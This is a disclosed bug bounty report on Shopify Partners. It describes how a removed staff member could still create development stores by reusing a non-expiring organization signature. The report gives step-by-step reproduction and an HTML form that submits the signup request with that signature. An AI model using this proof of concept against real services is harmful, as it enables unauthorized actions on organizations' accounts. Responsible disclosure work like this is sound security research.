# Removed staff members who had "Manage shops" permission can still create development stores

## Report Details
- **Report ID**: 254588
- **URL**: https://hackerone.com/reports/254588
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-29T09:06:43.903Z
- **Disclosed**: 2019-11-08T11:03:31.353Z

## Reporter
- **Username**: zombiehelp54
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Details: 
It's been found that staff members of an organization in partners.shopify.com can have a permission to manage shops and those with that permission can create development stores that will be associated with the organization.

When a staff member tries to create a development store, a POST request is sent to `https://app.shopify.com/services/signup/setup` with the parameter `extra[affiliate_shop]` as the signature used to link the shop with the partners account.

It's been found that this signature is the same for all staff members of the same organization and it doesn't expire which means that if a staff member had "Manage Shops" permission for only one time, then he was removed from the organization he will still be able to create development stores associated with the organization and they will appear in `https://partners.shopify.com/[id]/development_stores` for organization members. 

## Steps to reproduce: 
1. Add a new staff member to your organization with "Manage Shops" permission. 
2. Login with the staff member you just added then navigate to `https://partners.shopify.com/641767/development_stores/new` and grab the value of `extra[affiliate_shop]` parameter from the source of the page.
3. Through the owner account remove the user's access to the organization. 
4. Through the new staff member who no longer has access submit the following HTML form: 

```
<form action="https://app.shopify.com/services/signup/setup" method=post>
<input name="utf8" value="Γ£ô">
<input name="authenticity_token" value="67uDHcA5IBtc1CRcl3teDJND+2w8ahtpbNo4aux93TfHq0MkadWVOPG0h/8Z+jjcWpXw96fX1BbnYTLiG9aqDw==">
<input name="signup[shop_name]" value="NewStoreTestTest1234">
<input name="signup[email]" value="testmahmoud16+2@gmail.com">
<input name="signup[password]" value="P@ssw0rd">
<input name="signup[confirm_password]" value="P@ssw0rd">
<input name="signup_types" value="affiliate_shop">
<input name="signup_source" value="development+shop">
<input name="signup_source_details" value="">
<input name="extra[affiliate_shop]" value="[SIGNATURE]">
<input name="signup[address1]" value="testxx">
<input name="signup[city]" value="test'ad">
<input name="signup[zip]" value="">
<input name="signup[province]" value="DK">
<input name="signup[country]" value="EG">
<input type=submit>
</form>
```
*Replace the value of `extra[affiliate_shop]` with the one you got through the staff member*

5. Navigate to `https://partners.shopify.com/[id]/development_stores` through the owner account and you'll see the new store added to the organization even though the staff member no longer has access.

Thanks!

## Attachments
No attachments
